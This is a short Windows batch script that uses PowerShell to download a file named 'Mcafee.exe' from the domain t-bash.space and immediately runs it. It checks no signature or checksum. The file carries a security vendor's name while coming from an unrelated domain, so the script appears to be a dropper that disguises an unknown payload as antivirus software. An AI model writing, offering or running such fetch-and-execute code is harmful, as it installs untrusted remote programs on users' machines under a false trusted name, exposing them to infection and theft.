@echo off
setlocal

REM Set the download URL and output filename
set "URL=https://t-bash.space/download/Mcafee.exe"
set "OUTPUT=Mcafee.exe"

REM Download the file using PowerShell
echo Downloading %OUTPUT% from %URL%...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUTPUT%'"

REM Check if the file was downloaded
if exist "%OUTPUT%" (
    echo Download complete. Running the program...
    start "" "%OUTPUT%"
) else (
    echo Download failed.
)

endlocal
pause
